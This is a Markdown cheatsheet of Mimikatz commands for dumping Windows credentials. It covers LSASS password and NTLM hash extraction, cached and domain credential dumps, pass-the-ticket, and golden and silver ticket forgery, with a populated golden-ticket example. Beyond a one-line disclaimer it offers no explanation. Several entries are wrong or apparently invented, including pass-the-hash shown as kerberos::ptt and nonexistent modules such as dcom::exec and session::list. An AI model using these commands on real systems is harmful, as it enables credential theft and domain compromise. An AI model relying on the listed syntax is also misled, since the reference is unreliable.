# Mimikatz large Cheatsheet
> 29.07.2024

---


---

# Mimikatz Cheatsheet

**Note:** Use Mimikatz responsibly and only on systems for which you have explicit authorization.

## Basic Syntax

```plaintext
mimikatz # <module> [<options>]
```

### Command Line Execution

```bash
mimikatz.exe <command>
```

### Example

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

---

## Common Commands

### Privileges

- **Enable Debug Privileges:**
  ```plaintext
  privilege::debug
  ```

### Kerberos

- **Dump Kerberos Tickets:**
  ```plaintext
  kerberos::list
  ```

- **Export Kerberos Tickets:**
  ```plaintext
  kerberos::ptt <ticket_file>
  ```

- **Purge Kerberos Tickets:**
  ```plaintext
  kerberos::purge
  ```

### Credentials

- **Dump Passwords and Hashes:**
  ```plaintext
  sekurlsa::logonpasswords
  ```

- **Dump NTLM Hashes:**
  ```plaintext
  sekurlsa::logonpasswords /export
  ```

- **Dump LSASS Process Memory (admin required):**
  ```plaintext
  sekurlsa::logonpasswords /dump
  ```

### Pass-the-Hash (PTH)

- **Pass-the-Hash Authentication:**
  ```plaintext
  kerberos::ptt <ticket_file>
  ```

- **Pass-the-Ticket (PTT):**
  ```plaintext
  kerberos::ptt <ticket_file>
  ```

### Credential Dumping

- **Extract Cached Credentials:**
  ```plaintext
  lsadump::cache
  ```

- **Extract Domain Credentials:**
  ```plaintext
  lsadump::dcc
  ```

### Golden Ticket

- **Create Golden Ticket:**
  ```plaintext
  kerberos::golden /user:<username> /sid:<domain_sid> /krbtgt:<key> /rc4:<key> /ptt
  ```

### Silver Ticket

- **Create Silver Ticket:**
  ```plaintext
  kerberos::silver /user:<username> /rc4:<key> /sid:<domain_sid> /service:<service> /target:<target>
  ```

### DCOM/Remote Commands

- **Execute Commands on Remote Machines:**
  ```plaintext
  dcom::exec /command:<command>
  ```

### Mimikatz Modules

- **List Available Modules:**
  ```plaintext
  module::list
  ```

- **Load Module:**
  ```plaintext
  module::load <module_name>
  ```

- **Unload Module:**
  ```plaintext
  module::unload <module_name>
  ```

### Miscellaneous

- **Dump Credentials in a Specific Format:**
  ```plaintext
  sekurlsa::logonpasswords /json
  ```

- **Export Credentials to a File:**
  ```plaintext
  sekurlsa::logonpasswords /export <filename>
  ```

- **List Sessions:**
  ```plaintext
  session::list
  ```

### Example Usage

- **Enable Debug Privileges and Dump Passwords:**
  ```plaintext
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords
  ```

- **Dump and Export NTLM Hashes:**
  ```plaintext
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords /export
  ```

- **Create a Golden Ticket:**
  ```plaintext
  mimikatz # kerberos::golden /user:administrator /sid:S-1-5-21-3623811015-3361044348-30300820 /krbtgt:1234567890abcdef1234567890abcdef /rc4:1234567890abcdef1234567890abcdef /ptt
  ```

- **Dump Kerberos Tickets:**
  ```plaintext
  mimikatz # kerberos::list
  ```
